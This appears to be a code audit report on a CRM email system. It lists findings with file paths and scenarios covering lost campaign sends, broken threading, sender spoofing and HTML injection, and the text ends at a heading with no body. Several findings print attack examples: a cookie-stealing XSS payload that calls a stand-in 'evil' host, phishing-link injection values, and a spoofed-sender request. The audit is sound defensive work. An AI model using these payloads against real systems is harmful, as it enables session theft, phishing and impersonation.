# Email System Audit - 2026-08-30

Four parallel read-only audit agents over: inbox reply/thread, composers, send/receive API routes, signatures/assets. 79 findings - 1 critical, 24 high, 30 medium, 24 low.

Fixed in the same session (see git diff): one-line reply editor collapse; per-conversation reply draft loss; Reply-To ignored as reply destination; ComposeModal fabricated Message-ID breaking inbound threading; swallowed persist + schedule failures now surfaced; signature list preview sanitized.

## [CRITICAL] apps/crm/src/app/api/campaigns/[id]/send/route.ts:175

Campaign recipient pagination advances `offset` over a result set filtered by status='pending' while each processed batch is flipped to 'sent'/'failed'. The filtered set shrinks by exactly the batch size each page, so `range(offset, ...)` on the next iteration points past the remaining pending rows and returns empty; the loop exits and the campaign is marked status='sent'.

**Scenario:** Campaign with 1,000 recipients: page 1 processes rows 0-499 and marks them sent; the pending set is now 500 rows, but page 2 queries range(500,999) of that 500-row set, gets 0 rows, and stops. 500 recipients silently never receive the email, sent_count=500, campaign shows 'sent', and re-POSTing /send is rejected with 'Campaign has already been sent' — unrecoverable silent loss of half the audience for any campaign over 500 recipients.

## [HIGH] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:79

Composed emails are recorded with a fabricated RFC Message-ID: the code wraps the provider's API id (result.message_id, a Resend UUID) in angle brackets and stores it as inbox_messages.message_id and inbox_conversations.thread_id, while the actual Message-ID header sent on the wire is the server-generated result.rfc822_message_id (returned by /api/communications/send route.ts line 159 but ignored). email-intake (supabase/functions/email-intake/index.ts line 322) threads inbound replies by matching In-Reply-To/References against inbox_messages.message_id, which will never match the fabricated id.

**Scenario:** Agent composes a new email to a member via the Compose modal. The member replies. Intake finds no message with message_id equal to the reply's In-Reply-To (<rfc822-id>), so it creates a brand-new conversation; the agent's outbound context is stranded in a separate thread, and every subsequent exchange fragments further. Any ReplyForm reply made from the original composed conversation also emits In-Reply-To pointing at a Message-ID that never existed, breaking threading in the recipient's mail client.

## [HIGH] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:112

Failures persisting the sent email are swallowed: convError is only console.error'd and execution continues, and the inbox_messages insert result (line 115) is never checked. onOpenChange(false)/onMessageSent() still run and EmailComposer toasts 'Email sent successfully'.

**Scenario:** RLS rejects the inbox_conversations insert (e.g., column mismatch or policy change). The email is genuinely delivered to the recipient, but no conversation or message row exists anywhere in the CRM — there is no Sent folder either — so the org has zero record of client correspondence and the reply from the customer arrives as an orphaned new conversation with no context.

## [HIGH] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:221

handleSchedule never checks res.ok (POST line 221, PUT line 215) and reads result.draft?.id without handling error payloads. On any failure the modal still closes and EmailComposer toasts 'Email scheduled for <date>' (EmailComposer.tsx line 327), because no error is thrown.

**Scenario:** User schedules a follow-up email for Monday 9am; the POST to /api/inbox/drafts returns 500 (or 401 after session expiry). The UI reports the email as scheduled and closes. No inbox_drafts row with scheduled_at exists, the send-scheduled-emails function has nothing to send, and the client email silently never goes out.

## [HIGH] apps/crm/src/app/crm/inbox/_components/InboxFilters.tsx:236

The 'Sent' and 'Drafts' folders are dead UI: their onClick handlers only close the mobile drawer ('active: false, // Will be wired to outbound filter'), draftsCount is never passed by page.tsx (always 0), and grep shows no component in the app ever calls GET /api/inbox/drafts. Saved drafts are therefore write-only — there is no way to reopen one.

**Scenario:** Agent writes a long email, clicks 'Save draft' (toast confirms 'Draft saved'), closes the modal intending to finish later. The draft row exists in inbox_drafts but no screen lists it; clicking the 'Drafts' folder does nothing. The composed content is permanently unreachable through the UI — effective data loss despite a successful save.

## [HIGH] apps/crm/src/app/crm/inbox/_components/ReplyForm.tsx:66

The useEffect on selectedConversation.id unconditionally clears replyHtml and attachments, while the dock label two hundred lines later (line 276) claims 'Draft saved in this thread'. There is no per-conversation draft cache, no localStorage, no inbox_drafts write. The page-level Escape shortcut (page.tsx line 395) also deselects the conversation and unmounts ReplyForm, destroying the draft.

**Scenario:** Agent types a half-finished reply with two attachments, clicks another conversation to check a detail (or presses Escape with focus outside the editor), then returns. The reply text and attachments are gone. The UI explicitly told them the draft was saved in the thread, so they close the tab believing the work is preserved.

## [HIGH] apps/crm/src/app/crm/inbox/_components/ReplyForm.tsx:154

Reply recipient ignores the sender's Reply-To header: toAddress is lastInbound.from_address (falling back to contact_email/contact_phone). Intake stores reply_to_address on every inbound row (email-intake index.ts line 441) and ReplyForm even reads it — but only to resolve OUR From address (line 103), never as the destination.

**Scenario:** A member's employer HR system sends mail From no-reply@hrplatform.com with Reply-To: jane.doe@employer.com (a very common send-on-behalf pattern). The agent replies; the reply goes to no-reply@hrplatform.com and is black-holed. The agent sees 'Reply sent' and waits for an answer that can never come.

## [HIGH] apps/crm/src/lib/email/send-service.ts:166

The server accepts any params.from_email without validating it against the org's verified sender registry or domains — the entire reply-from discipline (resolveReplyFromAddress, verified-domain checks) is client-side only. With the system-wide RESEND_API_KEY fallback (line 339), the from address is only constrained by what the shared key can send as.

**Scenario:** Any authenticated CRM user POSTs /api/communications/send with from_email: 'billing@payitforwardhealth.com' (or, in a multi-tenant deployment on the shared key, another org's verified domain) and sends spoofed mail as a mailbox they were never granted. The inbox UI's careful 'Replying as' resolution provides no actual enforcement.

## [HIGH] apps/crm/src/components/email/SenderSelector.tsx:78

fetchAddresses is a useCallback with deps [value, onChange], and the mount effect depends on fetchAddresses. EmailComposer passes onChange as an inline arrow (EmailComposer.tsx:351), so every re-render of the composer produces a new callback identity, re-creating fetchAddresses and re-firing the effect. Each run calls setLoading(true), which swaps the entire From control for a 'Loading senders...' spinner (line 109-116), then refetches /api/email/sender-addresses.

**Scenario:** User types in Subject, To, or the body: every keystroke re-renders EmailComposer (setSubject/setToInput/setBody), which re-renders SenderSelector with a fresh onChange, which triggers a new network fetch of sender addresses. Result: one API request per keystroke and the From field visibly flickers between the Select and a loading spinner the whole time the user is composing; on a slow API the From selector is effectively unusable.

## [HIGH] apps/crm/src/components/email/EmailAttachments.tsx:145

onDrop builds `let next = [...attachments, ...newAttachments]` from the attachments prop captured at drop time and keeps calling onAttachmentsChange(next) after each sequential upload completes. Any state change made by the user between drop and completion (removing another attachment) is silently clobbered because `next` is a stale snapshot, not derived from current state. Additionally, the isUploading guard that serializes drops is component-local state (line 97), but EmailComposer unmounts EmailAttachments when the panel is collapsed (EmailComposer.tsx:572), so a collapse/re-expand during an in-flight upload resets isUploading and allows a second concurrent onDrop whose snapshot races the first.

**Scenario:** 1) User attaches wrong-file A (upload done), then drops large file B; while B uploads, user clicks X on A (enabled, since only is_uploading rows are disabled). A disappears — then B's loop finishes and calls onAttachmentsChange(next) where next still contains A: A is silently resurrected and the email is sent WITH the attachment the user removed. 2) User drops A, collapses the Attachments panel (unmounting the component), re-expands, drops B: two onDrop loops now run with divergent snapshots; whichever finishes last overwrites the other's result, leaving an attachment stuck in is_uploading=true forever — uploadingCount>0 permanently disables Send (EmailComposer.tsx:725) and the stuck row's remove button is disabled (line 415), so the user must reload and loses the draft.

## [HIGH] apps/crm/src/lib/comms/mergeFields.ts:162

renderTemplate (documented as 'Safe template rendering') substitutes {{field}} values from record/member/owner data into the template with no HTML escaping (resolveMergeField/formatValue return raw strings). dispatcher.ts:401 uses this to render the final body_html of outgoing emails. Any CRM record field containing HTML is injected verbatim into the email sent to recipients. (Adjacent to my assigned directory but directly on the merge-field-replacement send path.)

**Scenario:** A lead is captured from a public web form with first_name = '<a href="https://phish.example">Click here to verify your account</a>' (or '</td></table><div style=...>' etc.). A workflow/campaign sends 'Hi {{record.first_name}}' — the recipient receives an email containing the attacker-controlled live link/markup under the org's sending domain, and any in-app pane that re-renders the stored sent HTML renders the injected markup too. Even benign values like 'Smith & Sons <Holdings>' corrupt the rendered email.

## [HIGH] apps/crm/src/app/api/campaigns/[id]/send/route.ts:85

Scheduling a campaign only sets status='scheduled' and scheduled_at. Nothing in the codebase processes scheduled campaigns: no cron in apps/crm/vercel.json touches email_campaigns, and no query anywhere selects status='scheduled' to fire the send at scheduled_at.

**Scenario:** User schedules a campaign for tomorrow 9am and gets back success: 'Campaign scheduled for ...'. Tomorrow comes and goes; the campaign sits in 'scheduled' forever and no recipient ever receives it. The API's success message is a promise the system cannot keep.

## [HIGH] apps/crm/src/app/api/campaigns/[id]/send/route.ts:126

processCampaignEmails() is fired-and-forgotten (`.catch(...)`) after the HTTP response returns, in a serverless (Vercel) runtime, using the request-scoped cookie-based Supabase client. After the response is sent the function instance can be frozen/killed, and the request-scoped client may no longer be valid — enqueueing stops mid-way with the campaign stuck in status='sending'.

**Scenario:** On Vercel, a user sends a 2,000-recipient campaign; the route returns 'Campaign sending started' and the lambda is frozen seconds later. Only a fraction of recipients are enqueued, the final stats update never runs, the campaign shows 'sending' forever, and any retry is blocked by the 'Campaign is currently being sent' guard — no recovery path exists.

## [HIGH] apps/crm/src/app/api/inbox/drafts/route.ts:63

The drafts API accepts and stores scheduled_at, and the inbox composer's 'Schedule send' (ComposeModal handleSchedule) saves the draft and closes the dialog — but no worker, cron, or route ever reads inbox_drafts to send scheduled drafts. grep shows inbox_drafts is referenced only by the two drafts CRUD routes.

**Scenario:** User composes an email, picks 'Schedule' for Monday 8am; the dialog closes as if scheduled. Monday passes and the email is never sent — no error, no notification. The recipient never hears back and the user believes the mail went out.

## [HIGH] apps/crm/src/lib/email/send-service.ts:167

Client-supplied from_email/from_name from POST /api/communications/send are used verbatim as the From header with no validation against the org's registered sender addresses (email_sender_addresses / verified email_domains, exposed by /api/email/sender-addresses) and no per-user allowed_domain_ids enforcement. The 'registered org sender (preferred)' comment is not enforced anywhere.

**Scenario:** Any authenticated CRM user POSTs {channel:'email', to:'victim@x.com', subject:'...', body_html:'...', from_email:'ceo@payitforwardhealth.com', from_name:'CEO'} and the platform's Resend/SendGrid account (with the verified sending domain) delivers a DKIM-authenticated email impersonating any coworker or role address — user-level domain restrictions in the sender picker are purely cosmetic.

## [HIGH] apps/crm/src/app/api/communications/send/route.ts:141

The route accepts idempotency_key / the Idempotency-Key header, but send-service only uses it when the crm.comms.outbox_send feature flag is enabled (isCommsFlagEnabled default false). With the flag off (the default), the key is silently discarded, sendViaResend gets idempotencyKey: outboxRow?.idempotency_key === undefined, and there is no dedupe of any kind on the direct send path.

**Scenario:** User double-clicks Send in the inbox ReplyForm (or the client retries a timed-out request with the same Idempotency-Key, exactly as the header contract implies is safe). Two identical emails are delivered to the contact and two copies are persisted to the thread — the advertised idempotency contract does nothing in the default configuration.

## [HIGH] apps/crm/src/lib/email/send-service.ts:429

After the provider has already accepted the email, a failure inserting the sent_emails log row makes sendEmail return { success: false, error: 'Email sent but failed to log...' }, which the route converts to HTTP 500 'Failed to send email'. The send succeeded but the caller is told it failed.

**Scenario:** sent_emails insert fails (RLS change, column mismatch, transient DB error) right after Resend returns 200. The user sees 'Failed to send email', clicks Send again, and the recipient gets the email twice; with outbox disabled (default) nothing dedupes the retry. Same pattern for any exception thrown after the provider call (e.g. in persistOutboundInboxMessage) via the catch at line 508.

## [HIGH] apps/crm/src/lib/comms/dispatcher.ts:671

processMessageQueue (invoked by the CRON-secret-protected /api/comms/cron) builds its Supabase client from cookies() with the anon key. A cron request carries no user session, so RLS on crm_messages returns zero rows (and any error is swallowed — 'return { processed: 0 ... }'). Queued messages and scheduled retries are never processed; the cron reports success:true.

**Scenario:** dispatchMessage hits a transient SendGrid error, sets the message to status='queued' with next_retry_at=+1min and tells the caller 'queued'. The /api/comms/cron job runs every 2 minutes but its anonymous client can never see the row, so the message stays 'queued' forever. The customer never receives the email and no failure is ever surfaced.

## [HIGH] apps/crm/src/lib/comms/dispatcher.ts:540

sendMessageNow enqueues an outbox row (status 'queued', next_attempt_at=now()) and then submits to the provider itself, without ever checking outboxAlreadyAccepted on a reused row and without marking it 'submitting' first. The /api/email/outbox/process cron (every minute) claims 'queued'/'failed' rows and submits them independently. markOutboxSubmitting (outbox.ts:177) is also an unconditional update with no status guard. SendGrid has no idempotency key support, so neither lane dedupes the other.

**Scenario:** dispatchMessage sends an email; during the seconds the outbox row sits 'queued' while sendMessage awaits SendGrid, the outbox cron fires, claims the row, and submits it too — the contact receives the email twice. Worse: on a transient failure both retry lanes arm (outbox 'failed' + crm_messages 'queued'); when a later sendMessageNow retry runs, enqueueOutbox returns the row the cron already marked 'sent', the accepted state is ignored, and the message is sent again — guaranteed duplicate.

## [HIGH] apps/crm/src/lib/email/outbox-process.ts:56

submitOutboxRow rebuilds the provider payload from the outbox row, but the row's payload stores only attachment metadata (filename/content_type/size — see send-service.ts:281 and dispatcher.ts:555), never the attachment content, id, or storage path. Retries processed by the outbox worker therefore send the email without its attachments, with no error and no indication to anyone.

**Scenario:** User sends a contract PDF as a reply; Resend times out (transient), the inline path marks the outbox row 'failed', and the every-minute worker retries successfully — the recipient receives the email body with the PDF silently missing, while the CRM thread shows the message as sent with an attachment.

## [HIGH] apps/crm/src/lib/comms/mergeFields.ts:162

renderTemplate/formatValue substitute merge-field values into templates with no HTML escaping, and the rendered result is sent as text/html (dispatcher.ts:548 bodyHtml, comms/providers/sendgrid.ts:117) and stored in crm_messages/inbox threads. The identical flaw exists in sequences: enrollment-service.ts processMergeFields (line 510) interpolates record.data raw into step.body_html. Record data is attacker-influenced — it arrives from web forms and from the inbound webhook route that creates/updates crm_records from external payloads.

**Scenario:** A 'lead' submits a form with first_name = '<a href="https://evil.example/reset">Verify your account</a><div style="display:none">' . The org's template 'Hi {{data.first_name}}' renders that markup verbatim into the outbound HTML email, letting the attacker inject phishing links/content into mail sent from the org's authenticated domain, and into the CRM's stored message HTML.

## [HIGH] apps/crm/src/app/api/webhooks/email/sendgrid/route.ts:91

The handler matches events with .eq('provider_message_id', sg_message_id) using the full sg_message_id, but sent_emails.provider_message_id stores the short X-Message-Id returned at send time, while webhook events carry the extended form '<shortid>.filter####...'. (The sibling handler at /api/webhooks/sendgrid correctly does sg_message_id.split('.')[0].) No event can ever match; every event increments `failed`, and the route then returns 500 so SendGrid retries the batch forever.

**Scenario:** Org uses SendGrid: every delivered/open/click/bounce/spamreport event fails lookup, email_events never gets a row (opens/bounces invisible in the CRM), hard bounces and complaints never reach email_unsubscribes so the org keeps mailing dead/complaining addresses, and SendGrid's webhook queue retries the same batches endlessly against a permanently-500ing endpoint.

## [HIGH] apps/crm/src/lib/sequences/enrollment-service.ts:281

Sequence conditions and exit checks query email_events with event_type 'open' (281), 'click' (298), 'reply' (407), and 'bounce' (421), but the webhook handlers and the DB trigger use the vocabulary 'opened'/'clicked'/'bounced'/'complained' (and nothing ever records 'reply'). Every one of these checks is always false.

**Scenario:** An org enables stop_on_bounce and an email_opened branch. A contact's address hard-bounces on step 1: the 'bounce' query matches nothing, the exit never fires, and the sequence keeps queueing steps 2-5 to the dead address (only saved from actual sends by the separate unsubscribe list, and only when the Resend webhook is configured). email_opened / link_clicked conditions likewise never evaluate true, so any condition-gated content silently never varies.

## [HIGH] apps/crm/src/components/email/SignatureBuilder.tsx:188

Editing any detail field on an existing signature silently discards its stored HTML. When editing, selectedLayoutId initializes to null (line 140-142), and updateField's `else if (!selectedLayoutId)` branch calls applyLayout('pifh-horizontal', next), replacing content_html with a regenerated pifh-horizontal template. Worse, the `fields` state is seeded from org/profile defaults (mergeInitialFields, line 143-145), not from the signature's actual content, so the regenerated HTML also carries default values instead of what the signature really said. handleUploadedImage (lines 227, 237) has the same destructive fallback.

**Scenario:** A user saved a custom HTML signature (or a 'full-image' signature, or the 'Professional' layout). They click Edit and fix a typo in the Phone field. The entire signature is instantly replaced by the pifh-horizontal template populated with org defaults; photo, custom HTML, and chosen layout are gone. If they hit Save (the primary button), the original content_html is permanently overwritten with no undo.

## [HIGH] apps/crm/src/lib/email/signature-html.ts:231

getSignatureOrigin() prefers window.location.origin over NEXT_PUBLIC_APP_URL, and SignatureBuilder.handleSave (SignatureBuilder.tsx:252-258) uses it to absolutize root-relative src/href (including the default /signatures/pifh-logo.png logo) into the *stored* content_html. Whatever hostname the browser happened to be on is baked permanently into the signature and then sent in real emails. publicAssetOriginFromRequest (public-email-asset.ts:24-30) has the same class of bug server-side: with env vars unset it bakes request.nextUrl.origin into email_assets.public_url stored in the DB.

**Scenario:** An admin sets up their signature while running the app on http://localhost:3000, a Vercel preview URL, or an internal hostname. content_html is saved with src="http://localhost:3000/signatures/pifh-logo.png". Every email sent thereafter (EmailComposer appends signature.content_html verbatim to body_html) shows a broken logo to all recipients, and nothing in the UI reveals why because the in-app preview resolves the URL fine on that same host.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/inbox-reading.ts:25

EMAIL_IFRAME_SANDBOX combines allow-same-origin (srcDoc inherits the CRM app's origin) with allow-popups-to-escape-sandbox while rendering attacker-controlled email HTML. Scripts are blocked, but a clicked link opens an UNsandboxed popup whose window.opener references the same-origin email frame; the popup may navigate its opener (reverse tabnabbing). Email HTML can also carry <meta http-equiv=refresh> to navigate the reading pane with no click at all.

**Scenario:** A phishing email contains <a href='https://evil.example' target='_blank'>View invoice</a>. The agent clicks; evil.example opens outside the sandbox and sets opener.location to a pixel-perfect fake CRM login. The reading pane (rendered inside trusted CRM chrome) now shows the attacker's page; the agent enters credentials.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/ReplyForm.tsx:432

buildQuotedBody performs HTML injection of attacker-controlled inbound data into outgoing mail: msg.body_text is interpolated raw into <p>${msg.body_text}</p>, and msg.subject (line 430) and msg.from_name (line 420) are unescaped. The result becomes the compose editor's initial body and is sent as body_html.

**Scenario:** A plain-text inbound email contains '<div style=...>URGENT: wire funds to ...</div>' or an <img> tracking pixel. On forward, that markup renders as live styled HTML in the outgoing message, appearing authored by the forwarding agent. Conversely, an innocent text email containing '<important>' or 'a < b' is silently mangled/truncated in the forward because the text is parsed as markup.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/ReplyForm.tsx:136

Forward flow drops content: (a) composer attachments are silently discarded (setAttachments([]) at line 139; onForward only carries subject+body, and ComposeModal receives no initialAttachments); (b) the original message's attachments are never included in the forward; (c) the guard at line 128 plus the disabled Send button force the user to type text before forwarding; (d) forward always quotes lastMessage, so once the agent has replied, Forward quotes the agent's own reply instead of the customer's email.

**Scenario:** Agent needs to forward a member's email with its attached insurance PDF to a partner. They attach an extra file in the dock, hit Forward — the compose modal opens with neither the original PDF nor their added file, and nothing warns them; the partner receives a forward referencing attachments that are not there. If they try to forward without typing, they get the misleading error 'Please type a reply'.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/ReplyForm.tsx:121

Reply All is incomplete and can loop mail back into the org: it only uses lastInbound.cc_addresses (co-recipients in the original To header beyond the first are already dropped at intake — email-intake index.ts line 434 stores only toFirst — and are never re-added), and the self-filter compares CC entries only against the exact monitoredFrom string, missing the receiving-subdomain variant of the same mailbox.

**Scenario:** Inbound mail is sent To: support@payitforwardhealth.com, broker@partner.com, Cc: support@mail.payitforwardhealth.com. Agent hits Reply All: broker@partner.com is silently excluded (dropped at intake), while support@mail.payitforwardhealth.com stays in CC — the outbound reply re-enters email-intake as a new inbound message, incrementing unread counts and echoing the org's own reply into the queue.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/ReplyForm.tsx:194

The reply dock hardcodes channel:'email' and an email From/threading payload for every conversation, but the unified inbox also contains SMS conversations (created by the Twilio webhook with channel:'sms'). For those threads, toAddress resolves to a phone number and the dock still advertises 'Reply as support@...'.

**Scenario:** An inbound SMS thread is selected. The dock shows 'Reply as support@payitforwardhealth.com'; the agent types a reply and clicks Send. sendEmail posts to Resend with to='+15551234567', which the provider rejects — replying to SMS from the inbox is impossible, and the error ('Failed to send reply') gives no hint why.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/ReplyForm.tsx:127

Double-send paths: handleSendReply has no re-entrancy guard (no 'if (sending) return'; the button's disabled state lands only after re-render), and no idempotency key is sent. Worse, send-service.ts lines 427-430 return success:false AFTER the provider has accepted the mail whenever the sent_emails log insert fails, so the UI reports 'Failed to send reply' for an email that was actually delivered.

**Scenario:** The sent_emails insert hits an RLS/constraint error. The customer receives the reply, but the agent sees 'Email sent but failed to log to sent_emails' surfaced as a failure toast and clicks Send again — the customer receives the same reply twice. A fast double-click on Send similarly fires two POSTs before React disables the button.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:180

handleSave never checks res.ok on the drafts POST/PUT and silently ignores an error body (only reads result.draft?.id). Because it does not throw, EmailComposer's handleSave shows the success toast 'Draft saved' (EmailComposer.tsx line 291) even when nothing was persisted.

**Scenario:** The drafts POST returns 500. The user sees 'Draft saved', closes the modal (which also resets state), and the content is gone — compounded by the fact that even successful drafts have no UI to reopen them.

## [MEDIUM] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:243

Closing the dialog (Escape key or overlay click — Radix defaults are not suppressed) discards the entire composed email with no confirmation and clears draftIdRef/template state; there is no auto-save on close.

**Scenario:** User has written a long email and accidentally clicks the dimmed backdrop while reaching for the Templates button. The modal closes instantly; reopening Compose shows an empty form. All typed content, recipients, and attachments are lost.

## [MEDIUM] apps/crm/src/app/crm/inbox/page.tsx:317

updateStatus (wired to MessageThread's status Select) awaits the supabase update but never inspects its error — the supabase client returns errors rather than throwing, so the catch block is unreachable. toast.success and optimistic local state always run.

**Scenario:** An agent marks a conversation 'Resolved' while their session/RLS rejects the write. The UI shows 'Marked as resolved' and moves the thread out of the active list; on the next refresh the conversation reappears as open, and SLAs/reporting count it as never resolved despite the confirmed toast.

## [MEDIUM] apps/crm/src/components/email/types.ts:75

replaceMergeFields does `result.replace(regex, value)` with no HTML escaping AND with `value` as a string replacement, so JS replacement patterns in the data are expanded ($& re-inserts the literal '{{key}}', $` / $' insert surrounding text). Its output is rendered via dangerouslySetInnerHTML in EmailEditor preview (EmailEditor.tsx:266). The function's contract (Record<string,string> previewData plumbed through EmailComposer/LazyEmailEditor props) invites callers to pass real record data; today's callers pass static examples, so this is a loaded injection sink rather than a currently-exploitable one.

**Scenario:** Any future/consumer caller passes real contact data as previewData (the documented purpose of the prop): a contact named '<img src=x onerror=fetch(`//evil/`+document.cookie)>' executes in the CRM user's session the moment they click Preview. Separately, a value containing '$&' (e.g., a deal amount pasted as 'US$&50k') renders as 'US{{deal.amount}}50k' — corrupted preview output — because of unescaped replacement patterns.

## [MEDIUM] apps/crm/src/components/email/EmailComposer.tsx:125

All composer content lives in useState seeded once from initial* props; there is no way to update subject/body after mount. ComposeModal works around this with key={`${effectiveSubject}-${effectiveBody?.slice(0,50)}`} (ComposeModal.tsx:276), which remounts the whole composer when a template is applied, discarding every piece of non-initial state.

**Scenario:** In the inbox compose modal the user adds three recipients, CCs, uploads an attachment, and writes an intro — then clicks Templates and applies one. The key changes, EmailComposer remounts, and recipients beyond initialTo, all CC/BCC, the uploaded attachments, and the selected signature are silently wiped with no warning or undo.

## [MEDIUM] apps/crm/src/components/email/EmailComposer.tsx:201

getComposerData silently filters out attachments with error (and is_uploading) before send/schedule, and assertComposerAttachmentsReady (outbound-attachments.ts:158) also excludes errored attachments from its checks — so a failed upload never blocks Send or Schedule and is simply omitted.

**Scenario:** User attaches contract.pdf; the upload 500s (row shows a small red error). User clicks Send (button is not disabled by errored attachments) — assert passes, email goes out WITHOUT the contract, and the UI toasts 'Email sent successfully'. Same on Schedule, which never calls the assert at all (line 300-335). Recipient never gets the document and the sender believes they sent it.

## [MEDIUM] apps/crm/src/components/email/EmailComposer.tsx:285

handleSave has no attachment-readiness guard and getComposerData drops is_uploading rows, so saving a draft during an in-flight upload persists the draft without those attachments; there is no warning (unlike Send, which is disabled while uploadingCount > 0).

**Scenario:** User drops a 9MB file, immediately clicks 'Save Draft' while it uploads, sees 'Draft saved', and closes the composer. The draft was saved without the attachment; when the user later opens the draft and sends it, the file is gone and nothing ever indicated it wasn't saved.

## [MEDIUM] apps/crm/src/components/email/EmailAttachments.tsx:210

The action shown on a failed upload is an Upload icon that calls retryUpload(), whose implementation is just removeAttachment() (the comment admits 'Remove and let user re-add'). It never re-uploads.

**Scenario:** An upload fails from a transient network blip. The user clicks the upload/retry icon on the red row expecting a retry — the attachment silently vanishes from the list instead. If the user doesn't notice (panel collapsed or many files), they send the email without the file, believing they retried successfully.

## [MEDIUM] apps/crm/src/components/email/EmailAttachments.tsx:122

The maxTotalSize check computes newTotal = totalSize + file.size per file inside the validation loop, but totalSize is fixed from existing attachments — sizes of other files accepted in the same drop are never accumulated, so a single multi-file drop can blow past the 25MB total cap.

**Scenario:** With 0 attachments, user drops five 6MB PDFs at once: each is checked as 0+6MB <= 25MB and all pass, attaching 30MB total. The UI then shows '30 MB / 25 MB'. The send later fails at the provider/server (or produces an email many recipient servers bounce), and the limit the UI advertises was never enforced.

## [MEDIUM] apps/crm/src/components/email/EmailEditor.tsx:142

In Source mode every keystroke syncs the raw textarea HTML to the parent via onChange (line 146), while the UI still presents staged 'Apply Changes' and 'Cancel' buttons. Because the parent immediately pushes the changed content back down and the effect at line 133 setContent()s it into the editor, 'Cancel' (line 250, which merely flips the view and re-reads editor.getHTML()) cannot revert anything — the abandoned edits are already the editor/parent state.

**Scenario:** User opens Source, experimentally deletes half the HTML or breaks a table tag, decides against it and clicks 'Cancel'. The editor view returns showing the mangled content; parent state (EmailComposer body) also holds it. If they hit Send trusting Cancel reverted their edits, the mangled body is sent. The Apply/Cancel affordances are lies in every controlled usage.

## [MEDIUM] apps/crm/src/components/email/EmailComposer.tsx:253

handleSend/handleSchedule never flush the pending toInput/ccInput/bccInput text. An address typed into a recipient field but not committed with Enter/Add is silently ignored, while remaining visible in the input.

**Scenario:** User types 'boss@client.com' into To (it displays in the field) and clicks Send without pressing Enter. If another recipient chip already exists, the email sends without boss@client.com — no warning, and the address still sits visibly in the input, so the sender reasonably believes it was included. If it was the only recipient, they instead get the confusing 'Please add at least one recipient' despite an address being visible.

## [MEDIUM] apps/crm/src/app/api/webhooks/sendgrid/route.ts:80

The lookup uses .or(`provider_message_id.eq.${messageId},id.eq.${messageId}`) — messageId (a SendGrid short id like '14c5d75ce93') is not a UUID, so the id.eq branch fails the uuid cast and PostgREST rejects the entire query. The error is never checked (only `data` is destructured), the event is silently skipped, and the route still returns success.

**Scenario:** Every SendGrid event for a crm_message hits the malformed or-filter, the whole query errors, `message` is null, and the loop continues. crm_messages statuses never progress past 'sent' (no delivered/bounced/spam updates), crm_message_events stays empty, and the endpoint reports {success:true, processed:0} so nobody notices.

## [MEDIUM] apps/crm/src/app/api/webhooks/email/resend/route.ts:165

Any 'email.bounced' event upserts the recipient into email_unsubscribes labelled 'Hard bounce', without checking event.data.bounce.type. Resend distinguishes Permanent vs Transient/Undetermined bounces; a soft bounce (mailbox full, greylisting) permanently suppresses the address. The same unconditional suppression exists in the SendGrid handler (webhooks/email/sendgrid/route.ts:140, which also maps 'dropped' to 'bounced').

**Scenario:** A prospect's mailbox is temporarily full; Resend reports a Transient bounce; the address lands in email_unsubscribes. From then on every campaign send (enqueueCampaignEmail suppression check) and sequence step silently skips them forever, and the recipient is marked 'failed' with no way for staff to see why mail stopped.

## [MEDIUM] apps/crm/src/lib/sequences/enrollment-service.ts:322

Condition steps are doubly dead: evaluateCondition computes condition_met and config carries then_step_id/else_step_id, but advanceToNextStep (line 336) always advances linearly by step_order and never reads the result. Additionally, the execution row is inserted with status:'executed', which violates the email_sequence_step_executions status CHECK constraint ('pending','sent','delivered','opened','clicked','replied','bounced','failed','skipped'), and the insert error is not checked — so even the audit row is silently dropped.

**Scenario:** A user builds 'if opened → send follow-up A, else → send breakup email B'. At runtime every enrollment marches straight through in step order regardless of the condition; both branches' emails go to everyone in sequence order, and no execution record exists to show the condition was ever evaluated.

## [MEDIUM] apps/crm/src/lib/email/send-service.ts:486

conversation_id from the request body is never validated as belonging to the caller's organization before persistOutboundInboxMessage inserts with the service-role client. The AFTER INSERT trigger update_conversation_on_message then updates the referenced inbox_conversations row (message_count, last_message_at, preview) with no org check — the trigger matches purely on conversation_id.

**Scenario:** An attacker in org A who obtains a conversation UUID from org B (leaked link, log, or shared screen) sends an email via /api/communications/send with conversation_id set to that UUID. The service-role insert succeeds and the trigger overwrites org B's conversation preview with attacker-chosen text and bumps its counters — a cross-tenant write into another org's inbox.

## [MEDIUM] apps/crm/src/lib/email/persist-inbox-reply.ts:60

When the inbox_messages insert for the outbound copy fails, persistOutboundInboxMessage logs only {organizationId, conversationId} — discarding the actual Postgres error — and returns null; sendEmail still returns success:true. The failure is invisible to both the user and anyone debugging.

**Scenario:** A schema/constraint issue (e.g. references_ids type mismatch) makes the persist insert fail. Replies keep 'sending' fine, but none of them appear in the conversation thread; agents lose the record of what they told customers, and the log line contains no error detail with which to diagnose it.

## [MEDIUM] apps/crm/src/app/api/communications/send/route.ts:104

The 1:1 send path performs no recipient hygiene at all: no email-format validation on to/cc/bcc, no cap on recipient counts, and — unlike campaigns and sequences — no check of email_unsubscribes, so complaints, hard bounces, and unsubscribes are ignored for direct sends.

**Scenario:** A user pastes 5,000 addresses into bcc (a single request, so the 50/hour rate limit never triggers) and bulk-mails through the transactional path, bypassing campaign throttles and the suppression list — including recipients who unsubscribed or filed spam complaints, jeopardizing the shared sending domain's reputation and CAN-SPAM compliance.

## [MEDIUM] apps/crm/src/lib/email/outbox.ts:249

claimOutboxBatch only claims rows in ('queued','failed'); leased_until is written but never consulted anywhere, and no reaper resets stale 'leased' or 'provider_submitting' rows. The inline path compounds this: an exception during the provider call (fetch timeout, non-JSON error body at send-service.ts:726) bypasses markOutboxFailed and leaves the row in 'provider_submitting' permanently (send-service.ts catch at 508).

**Scenario:** The outbox worker crashes after leasing 25 rows, or a Resend call times out mid-submit: those emails wedge in 'leased'/'provider_submitting' forever — never retried, never marked failed, never dead-lettered — and the queued mail silently never leaves while the outbox table shows them perpetually in-flight.

## [MEDIUM] apps/crm/src/app/api/crm/webhooks/inbound/route.ts:291

